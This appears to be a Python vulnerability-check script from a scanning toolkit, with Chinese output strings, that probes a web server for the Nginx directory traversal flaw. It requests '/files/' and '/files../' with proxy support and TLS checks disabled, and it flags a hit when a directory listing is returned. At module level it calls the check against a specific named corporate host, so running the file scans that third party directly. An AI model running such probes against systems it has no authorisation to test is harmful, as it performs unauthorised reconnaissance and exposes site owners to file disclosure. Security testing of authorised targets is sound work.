import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def dl1(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        da=['/files/','/files../']
        for i in da:
            aa = requests.get(url1 + i, cookies=s_cookie, proxies=proxies, verify=False, timeout=5)
            aa.encoding = 'utf-8'
            cd = BeautifulSoup(aa.text, 'html.parser')
            if 'Index of' in cd.text:
                uj = '[+]漏洞存在\n' + cd.text
                print(uj)
            else:
                uj = '[-]漏洞不存在'
    except Exception as aaa:
        uj='[-]请求错误\n'+str(aaa)
a('http://itstest.newchinalife.com/','')
"""
def jg8():
    global uj
    return '\n[ Nginx 目录穿越漏洞 ]\n\n'+ str (uj)+'\n----------------------------------------------------------------------------------'
def u8(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
"""